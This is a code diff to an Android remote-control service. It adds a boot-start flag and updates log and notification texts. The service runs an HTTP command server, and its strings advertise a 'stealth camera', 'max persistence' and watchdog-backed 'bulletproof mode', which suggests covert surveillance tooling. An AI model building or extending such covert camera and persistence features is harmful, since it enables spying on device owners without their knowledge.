@@ -45,17 +45,20 @@ public class RemoteControlService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         boolean isAutoStart = intent != null && intent.getBooleanExtra("auto_start", false);
         boolean isWatchdogRestart = intent != null && intent.getBooleanExtra("watchdog_restart", false);
+        boolean isBootStart = intent != null && intent.getBooleanExtra("boot_start", false);
         
-        if (isAutoStart) {
-            Log.i(TAG, "Remote Control Service auto-started on boot");
+        if (isBootStart) {
+            Log.i(TAG, "🚀 Remote Control Service started on device boot - fully automatic");
         } else if (isWatchdogRestart) {
             Log.i(TAG, "🛡️ Remote Control Service restarted by watchdog - bulletproof mode active");
+        } else if (isAutoStart) {
+            Log.i(TAG, "🤖 Remote Control Service auto-started");
         } else {
-            Log.i(TAG, "Remote Control Service started manually");
+            Log.i(TAG, "📱 Remote Control Service started manually");
         }
         
         // Start as foreground service
-        startForeground(NOTIFICATION_ID, createNotification(isAutoStart, isWatchdogRestart));
+        startForeground(NOTIFICATION_ID, createNotification(isAutoStart, isWatchdogRestart, isBootStart));
         
         // Start HTTP server to listen for commands
         boolean serverStarted = httpServer.startServer();
@@ -110,22 +113,25 @@ public class RemoteControlService extends Service {
      * Create notification for foreground service
      */
     private Notification createNotification() {
-        return createNotification(false, false);
+        return createNotification(false, false, false);
     }
     
     /**
      * Create notification for foreground service with startup info
      */
-    private Notification createNotification(boolean isAutoStart, boolean isWatchdogRestart) {
+    private Notification createNotification(boolean isAutoStart, boolean isWatchdogRestart, boolean isBootStart) {
         String title;
         String text;
         
         if (isWatchdogRestart) {
             title = "🛡️ Remote Control Bulletproof";
             text = "Restarted by watchdog - stealth camera & max persistence active";
+        } else if (isBootStart) {
+            title = "🚀 Remote Control Boot-Started";
+            text = "Started on device boot - stealth camera & bulletproof mode active";
         } else if (isAutoStart) {
             title = "🤖 Remote Control Auto-Started";
-            text = "Auto-started on boot - stealth camera & bulletproof mode active";
+            text = "Auto-started - stealth camera & bulletproof mode active";
         } else {
             title = "Remote Control Active";
             text = "Stealth camera & remote control via WiFi ready";
